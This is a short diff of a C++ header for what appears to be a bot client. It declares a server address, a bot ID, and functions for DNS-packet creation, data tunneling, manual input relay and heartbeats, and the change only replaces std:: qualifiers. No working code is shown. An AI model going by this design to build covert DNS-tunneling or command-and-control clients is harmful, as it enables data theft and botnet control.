@@ -1,15 +1,16 @@
 #pragma once
 #include <string>
 #include <winsock2.h>
+using namespace std;
 
 extern const char* SERVER_IP;
 extern const int SERVER_PORT;
 extern const char* BOT_ID;
 extern SOCKET clientSocket;
 
-std::string CreateDNSPacket(const std::string& jsonData);
+string CreateDNSPacket(const string& jsonData);
 bool InitializeConnection();
-bool SendDataTunnel(const std::string& data);
-void SendManualInput(const std::string& content);
+bool SendDataTunnel(const string& data);
+void SendManualInput(const string& content);
 void SendHeartbeat();
 
